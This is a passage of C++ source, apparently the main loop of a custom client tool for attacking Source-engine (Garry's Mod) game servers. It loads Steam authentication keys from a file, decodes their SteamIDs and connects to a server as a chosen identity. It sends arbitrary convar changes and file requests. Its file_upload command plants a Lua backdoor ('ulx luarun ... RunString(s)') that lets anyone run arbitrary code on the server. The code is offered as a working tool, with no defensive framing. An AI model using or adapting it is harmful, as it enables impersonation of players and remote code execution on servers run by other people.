	parseip(argv[1], serverip, serverport);//and this is the point where you call me a retard for not using strtok

	clientport = atoi(argv[2]);

	strcpy(nickname, argv[3]);


	if (strlen(nickname) == 1)
	{

		memset(nickname, 0, sizeof(nickname));

		for (int i = 0; i < 10; i++)
			nickname[i] = 65 + rand() % 60;

	}
	
	chosenkey = atoi(argv[4]);

	steamid64 = _atoi64(argv[5]);

	if (argv[6]&&strnlen(argv[6], 5)>0)
	{
		password = argv[6];
	}
	else {
		argv[6] = "";
	}

	if (argv[7])
	{
		strcpy(runcmd, argv[7]);

	}else {
		argv[7] = "";
	}

	WSADATA wsaData;

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	serversock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);


	int optval = 1;
	int optlen = sizeof(optval);

#ifdef _WIN32
	unsigned long mode = 1;
	setsockopt(serversock, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, optlen);
#else
	setsockopt(serversock, SOL_SOCKET, SO_REUSEADDR, &optval, optlen);
	setsockopt(serversock, SOL_SOCKET, SO_REUSEPORT, &optval, optlen);

#endif

	sockaddr_in add;
	add.sin_family = AF_INET;
	add.sin_addr.s_addr = htonl(INADDR_ANY);
	add.sin_port = htons(clientport);

	int ret = bind(serversock, reinterpret_cast<SOCKADDR *>(&add), sizeof(add));
	if (ret < 0)
	{
		int err = lastneterror();
		if (err == 10035)
			return 1;

		printf("lastneterror - bind failed %i\n", err);
		return 1;
	}

	netchan->Initialize();
	NET_ResetDatagram();


	std::ifstream key_stream;
	key_stream.open("keys.txt", std::ifstream::in | std::ifstream::binary);

	if (!key_stream.is_open())
	{
		printf("No keys!\n");
		_sleep(3000);
		return 0;
	}

	key_stream.seekg(0, key_stream.end);
	unsigned int length = key_stream.tellg();
	key_stream.seekg(0, key_stream.beg);

	
	char* readkeys = new char[length];

	key_stream.read(readkeys, length);
	key_stream.close();


	int parsedkeys_num = 0;

	for ( unsigned int i = 0; i < length; i++)
	{
		if (!(readkeys[i] == '\\' && readkeys[i + 1] == 'x' && readkeys[i + 2] == 'F' && readkeys[i + 3] == '2'))
			continue;

		
		char key[244];

		unsigned int added = 0;
		unsigned int c = 0;

		
		while (added != 244)
		{
			if (i + c > length)
				break;

			if (readkeys[i + c] == '\\' &&readkeys[i + c+1] == 'x')
			{
				char hexchars[2];
				hexchars[0] = readkeys[i + c + 2];
				hexchars[1] = readkeys[i + c + 3];
				hexchars[2] = 0;

				int data = strtol(hexchars, 0, 16);
				key[added] = data;

				added++;

			}

			c++;

		}

		char winner[5];
		winner[0] = key[2];
		winner[1] = key[3];
		winner[2] = key[4];
		winner[3] = key[5];


		unsigned long long cock = *(unsigned long long *)winner;

		char steamid[30];

		sprintf(steamid, "STEAM_0:%u:%u", (cock % 2) ? 1 : 0, (unsigned int)cock / 2);

		printf("%i === %s\n", parsedkeys_num+1, steamid);

		memcpy(parsedkeys[parsedkeys_num], key, 244);
		parsedkeys_num++;

		i = i + c;
	}


	if (chosenkey == -1)
	{


		std::cout << "Select a number ( " << parsedkeys_num << " keys available )\n";

		char choice[10];
		std::cin.getline(choice, 10);

		chosenkey = atoi(choice)-1;


	}
	
	if (chosenkey < 0)
	{
		if (chosenkey == -2)
		{
			chosenkey = parsedkeys_num-1;
		}
		else {

			chosenkey = rand() % parsedkeys_num-1;
		}

	}




	if (!parsedkeys[chosenkey])
	{
		printf("invalid key or selection!");
		return 0;
	}



	printf("Chosen key: %i\n", chosenkey+1);

	printf("Connecting to %s:%i | client port: %i | Nick: %s | Pass: %s\n", serverip, serverport, clientport, nickname, password);

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)networkthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sendthread, 0, 0, 0);



	char input[255];
	memset(input, 0, sizeof(input));

	while (true)
	{
		std::cin.getline(input, sizeof(input));

		for (unsigned int i = 0; i < strlen(input); i++)
		{
			if (input[i] == '<')
				input[i] = 0xA;
		}

		if (strstr(input, "retry"))
		{
			NET_Disconnect();
		}

		if (strstr(input, "connect "))
		{


			memmove(input, input + strlen("connect "), sizeof(input));

			parseip(input, serverip, serverport);
			printf("Connecting to: %s:%i\n", serverip, serverport);
			memset(input, 0, sizeof(input));


			NET_Reconnect();
			_sleep(100);
			continue;

		}

		if (strstr(input, "setcv "))
		{


			memmove(input, input + strlen("setcv "), strlen("setcv"));


			char cv[255];
			char var[255];

			bool found_delimit = false;

			for (unsigned int i = 0; i < strlen(input); i++)
			{
				if (input[i] == ':')
				{
					strncpy(cv, input, i);
					strncpy(var, input + i, strlen(input) - i);
					cv[i] = '\0';
					var[strlen(input) - i] = '\0';

					found_delimit = true;
					break;
				}

			}

			if (!found_delimit)
			{
				memset(input, 0, sizeof(input));
				continue;
			}

			printf("Setting convar %s to %s\n", cv, var);

			NET_ResetDatagram();

			senddata.WriteUBitLong(5, 6);
			senddata.WriteByte(1);
			senddata.WriteString(cv);
			senddata.WriteString(var);

			NET_SendDatagram(false);

		}

		if (strstr(input, "file_download"))
		{
			char file[255];

			bool found_delimit = false;

			for (unsigned int i = 0; i < strlen(input); i++)
			{
				if (input[i] == ' ')
				{
					strncpy(file, input + i + 1, strlen(input) - i - 1);
					file[strlen(input) - i - 1] = '\0';

					found_delimit = true;
					break;
				}

			}
			printf("Requesting file: %s\n", file);

			NET_ResetDatagram();

			static int requests = 100;
			senddata.WriteUBitLong(2, 6);
			senddata.WriteUBitLong(requests++, 32);
			senddata.WriteString(file);
			senddata.WriteOneBit(1);

			NET_SendDatagram(false);

		}

		if (strstr(input, "file_upload"))
		{
			char file[255];

			bool found_delimit = false;

			for (unsigned int i = 0; i < strlen(input); i++)
			{
				if (input[i] == ' ')
				{
					strncpy(file, input + i + 1, strlen(input) - i - 1);
					file[strlen(input) - i - 1] = '\0';

					found_delimit = true;
					break;
				}

			}

			printf("Uploading file: %s\n", file);

			NET_ResetDatagram();
			GenerateLeyFile(file, "ulx luarun concommand.Add([[hi]], function(p,c,a,s)  RunString(s) end)");
			NET_SendDatagram(true);

		}

		if (strstr(input, "cmd "))
		{


			memmove(runcmd, input + strlen("cmd "), sizeof(input));

			continue;

		}

		if (strstr(input, "name "))
		{
			memset(nickname, 0, sizeof(nickname));

			memmove(nickname, input + strlen("name "), sizeof(input));
			
			NET_ResetDatagram();
			senddata.WriteUBitLong(5, 6);
			senddata.WriteByte(0x1);
			senddata.WriteString("name");
			senddata.WriteString(nickname);

			NET_SendDatagram(false);

			printf("Changed name to: %s\n", nickname);
			continue;

		}

		memset(input, 0, sizeof(input));
		_sleep(100);
	}

	if (serversock)
		closesocket(serversock);

	WSACleanup();

	return 1;
}